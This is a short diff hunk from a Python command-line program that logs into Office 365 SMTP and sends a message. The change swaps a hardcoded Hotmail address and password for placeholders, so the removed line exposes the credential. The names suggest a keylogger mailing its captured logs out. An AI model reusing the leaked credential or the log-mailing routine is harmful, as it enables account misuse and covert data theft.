@@ -129,7 +129,7 @@ class MyPrompt(cmd.Cmd):
         server = smtplib.SMTP('smtp.office365.com', 587)
         server.ehlo()
         server.starttls()
-        server.login('mypylog@hotmail.com', '@PyKeyLog35!')
+        server.login('your hotmail adress', 'your password')
         server.send_message(msg)
         server.quit()
 
